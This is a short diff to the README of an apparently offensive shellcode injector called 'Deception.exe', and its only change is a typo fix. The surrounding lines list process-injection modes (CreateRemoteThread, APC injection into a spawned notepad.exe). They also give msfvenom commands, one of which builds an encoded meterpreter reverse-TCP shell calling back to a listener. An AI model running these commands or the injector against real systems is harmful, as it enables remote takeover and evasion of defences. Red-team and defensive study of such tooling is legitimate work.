@@ -24,7 +24,6 @@ Later versions will incorporate
     - kernel32 and ntdll.dll (direct syscalls)
     - In other languages (C++, Nim, ...)
 
-
 ### Usage
 ```
 # Compile
@@ -42,7 +41,7 @@ Usage:
   ./Deception.exe msf.bin -r       # for remote: CreateRemoteThread via given PID
   ./Deception.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject
   ./Deception.exe msf.bin -a       # makes all of the above
-Paylod Examples: 
+Payload Examples: 
    msfbin: msfvenom -p windows/x64/exec -f raw CMD=calc.exe -o msf.bin
    msfbin: msfvenom -p windows/x64/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=192.168.0.1 LPORT=8080 -f raw -o msf.bin
 ```
